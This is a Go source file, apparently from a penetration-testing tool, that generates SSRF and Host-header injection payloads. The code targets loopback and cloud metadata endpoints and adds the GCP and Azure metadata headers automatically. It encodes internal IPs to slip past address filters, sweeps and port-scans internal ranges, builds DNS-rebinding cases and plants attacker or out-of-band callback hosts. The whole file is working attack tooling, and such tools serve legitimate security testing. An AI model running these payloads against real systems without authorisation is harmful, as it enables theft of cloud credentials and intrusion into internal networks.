package gen

import (
	"fmt"
	"io/fs"
	"strings"

	"github.com/dripentest/postern/internal/ipenc"
)

type Params struct {
	LHOST      string
	TARGET     string
	EVIL       string
	HOST       string
	Sweep      []string
	ScanHosts  []string
	Ports      []int
	Rebind     []string
	SweepEnc   []string
	ScanEnc    []string
	RebindOnly bool
}

type OOB interface {
	Enabled() bool
	Alloc() string
	Record(host, label string)
}

type Case struct {
	ID      string
	Mode    string
	Source  string
	Payload string
	Header  string
	Variant string
	Path    string
	Param   string
	OOB     string
	Label   string
	Tag     string
	ReqHdr  string // extra request header this payload needs (e.g. metadata flavor)
}

// metadataHeader returns the request header a metadata endpoint requires, so the
// payload carries it automatically instead of the user passing a global flag:
// GCP/Yandex need Metadata-Flavor, Azure IMDS needs Metadata: true. Only the
// payload that needs it gets it - other requests stay byte-identical to the input.
func metadataHeader(u string) string {
	switch {
	case strings.Contains(u, "computeMetadata"):
		return "Metadata-Flavor: Google"
	case strings.Contains(u, "/metadata/instance"), strings.Contains(u, "/metadata/identity"):
		return "Metadata: true"
	}
	return ""
}

var ssrfFiles = []string{"ssrf-targets.txt", "metadata.txt", "schemes.txt", "redirect-rebind.txt"}

func SSRF(fsys fs.FS, p Params, o OOB) ([]Case, error) {
	if len(p.Ports) > 0 {
		return scanCases(p), nil
	}
	if p.RebindOnly {
		return rebindCases(p, 0), nil
	}
	var cases []Case
	n := 0
	for _, fname := range ssrfFiles {
		lines, err := loadLines(fsys, fname)
		if err != nil {
			return nil, err
		}
		for _, raw := range lines {
			id := fmt.Sprintf("s%04d", n)
			val, oobHost, skip := expand(raw, id, p, o)
			if skip {
				continue
			}
			n++
			if oobHost != "" {
				o.Record(oobHost, val)
			}
			cases = append(cases, Case{ID: id, Mode: "ssrf", Source: fname, Payload: val, OOB: oobHost, Label: val, ReqHdr: metadataHeader(val)})
		}
	}
	// IP-encoding bypasses, generated for the target IPs (adaptive, tagged by kind).
	for _, tip := range encodeTargets(p.TARGET) {
		for _, r := range ipenc.Encode(tip) {
			id := fmt.Sprintf("s%04d", n)
			n++
			val := "http://" + r.Value
			cases = append(cases, Case{ID: id, Mode: "ssrf", Source: "ipenc", Payload: val, Label: val, Tag: r.Kind})
		}
	}
	// Sweep: plain, or (with -sweep-encode) each IP in the requested encodings.
	for _, ip := range sweepIPs(p.Sweep) {
		if len(p.SweepEnc) > 0 {
			for _, r := range ipenc.EncodeKinds(ip, p.SweepEnc) {
				id := fmt.Sprintf("s%04d", n)
				n++
				val := "http://" + r.Value
				cases = append(cases, Case{ID: id, Mode: "ssrf", Source: "sweep", Payload: val, Label: val, Tag: r.Kind})
			}
			continue
		}
		id := fmt.Sprintf("s%04d", n)
		n++
		val := "http://" + ip
		cases = append(cases, Case{ID: id, Mode: "ssrf", Source: "sweep", Payload: val, Label: val})
	}
	cases = append(cases, rebindCases(p, n)...)
	return cases, nil
}

func rebindCases(p Params, start int) []Case {
	var cases []Case
	n := start
	for _, h := range p.Rebind {
		for _, val := range []string{"http://" + h + "/", "http://" + h + "/latest/meta-data/"} {
			id := fmt.Sprintf("s%04d", n)
			n++
			cases = append(cases, Case{ID: id, Mode: "ssrf", Source: "rebind", Payload: val, Label: val})
		}
	}
	return cases
}

func LoadHostHeaders(fsys fs.FS) ([]string, error) {
	return loadLines(fsys, "host-headers.txt")
}

func Host(fsys fs.FS, p Params, o OOB, allow map[string]bool, paths []string) ([]Case, error) {
	headers, err := loadLines(fsys, "host-headers.txt")
	if err != nil {
		return nil, err
	}
	values, err := loadLines(fsys, "host-values.txt")
	if err != nil {
		return nil, err
	}

	values = append(values, sweepIPs(p.Sweep)...)
	if len(paths) == 0 {
		paths = []string{""}
	}

	var cases []Case
	n := 0
	seen := map[string]bool{}
	for _, h := range headers {
		if allow != nil && !allow[h] {
			continue
		}
		isHost := strings.EqualFold(h, "Host")
		for _, rawv := range values {
			var variants [][2]string
			if isHost {
				variants = [][2]string{
					{"replace", "replace Host"},
					{"dup", "duplicate Host"},
					{"absolute", "absolute-URI + Host"},
				}
			} else {
				variants = [][2]string{{"add", "add " + h}}
			}
			for _, v := range variants {
				for _, path := range paths {
					id := fmt.Sprintf("h%04d", n)
					val, oobHost, skip := expand(rawv, id, p, o)
					if skip {
						continue
					}
					// Drop exact duplicates: host-values.txt repeats some values
					// across sections (e.g. 127.0.0.1 forms), which otherwise fire
					// the same request twice under different IDs.
					key := h + "\x00" + v[0] + "\x00" + path + "\x00" + val
					if seen[key] {
						continue
					}
					seen[key] = true
					n++
					label := fmt.Sprintf("%s: %s [%s]", h, val, v[0])
					if path != "" {
						label += " " + path
					}
					if oobHost != "" {
						o.Record(oobHost, label)
					}
					cases = append(cases, Case{ID: id, Mode: "host", Source: "host", Payload: val, Header: h, Variant: v[0], Path: path, OOB: oobHost, Label: label})
				}
			}
		}
	}
	return cases, nil
}

func scanCases(p Params) []Case {
	hosts := p.ScanHosts
	if len(hosts) == 0 {
		hosts = []string{"127.0.0.1"}
	}
	// Encoding for the host part so a filter that blocks plain internal IPs can be
	// bypassed during the scan. -scan-encode wins for -scan-host; otherwise reuse
	// -sweep-encode (a sweep feeds these same hosts). Only helps when the backend
	// fetcher actually resolves the encoded form.
	enc := p.ScanEnc
	if len(enc) == 0 {
		enc = p.SweepEnc
	}
	var cases []Case
	n := 0
	emit := func(host, tag string) {
		for _, port := range p.Ports {
			scheme := "http"
			if port == 443 || port == 8443 {
				scheme = "https"
			}
			val := fmt.Sprintf("%s://%s:%d", scheme, host, port)
			cases = append(cases, Case{ID: fmt.Sprintf("p%05d", n), Mode: "ssrf", Source: "scan", Payload: val, Label: val, Tag: tag})
			n++
		}
	}
	for _, host := range hosts {
		if len(enc) > 0 {
			if reps := ipenc.EncodeKinds(host, enc); len(reps) > 0 {
				for _, r := range reps {
					emit(r.Value, r.Kind)
				}
				continue
			}
		}
		emit(host, "")
	}
	return cases
}

// encodeTargets is the set of internal IPs whose encodings we generate: loopback
// and cloud-metadata by default, plus -itarget when it differs.
func encodeTargets(target string) []string {
	out := []string{"127.0.0.1", "169.254.169.254"}
	target = strings.TrimSpace(target)
	if target != "" {
		for _, e := range out {
			if e == target {
				return out
			}
		}
		out = append(out, target)
	}
	return out
}

func sweepIPs(bases []string) []string {
	var out []string
	for _, b := range bases {
		b = strings.TrimSpace(strings.TrimSuffix(strings.TrimSpace(b), "."))
		if b == "" {
			continue
		}
		for i := 0; i <= 255; i++ {
			out = append(out, fmt.Sprintf("%s.%d", b, i))
		}
	}
	return out
}

func expand(s, id string, p Params, o OOB) (val, oobHost string, skip bool) {
	if strings.Contains(s, "{{OOB}}") || strings.Contains(s, "{{COLLAB}}") {
		if o == nil || !o.Enabled() {
			return "", "", true
		}
		sub := o.Alloc()
		s = strings.ReplaceAll(s, "{{OOB}}", sub)
		s = strings.ReplaceAll(s, "{{COLLAB}}", sub)
		oobHost = sub
	}

	if strings.Contains(s, "{{EVIL}}") {
		switch {
		case p.EVIL != "":
			s = strings.ReplaceAll(s, "{{EVIL}}", p.EVIL)
		case o != nil && o.Enabled():
			sub := o.Alloc()
			s = strings.ReplaceAll(s, "{{EVIL}}", sub)
			oobHost = sub
		default:
			return "", "", true
		}
	}

	if strings.Contains(s, "{{LHOST}}") {
		if p.LHOST == "" {
			return "", "", true
		}
		s = strings.ReplaceAll(s, "{{LHOST}}", p.LHOST)
	}

	if strings.Contains(s, "{{HOST}}") {
		if p.HOST == "" {
			return "", "", true
		}
		s = strings.ReplaceAll(s, "{{HOST}}", p.HOST)
	}

	target := p.TARGET
	if target == "" {
		target = "127.0.0.1"
	}
	s = strings.ReplaceAll(s, "{{TARGET}}", target)

	return s, oobHost, false
}

func loadLines(fsys fs.FS, name string) ([]string, error) {
	data, err := fs.ReadFile(fsys, name)
	if err != nil {
		return nil, fmt.Errorf("read %s: %w", name, err)
	}
	var out []string
	for _, line := range strings.Split(string(data), "\n") {
		line = strings.TrimSpace(line)
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		out = append(out, line)
	}
	return out, nil
}
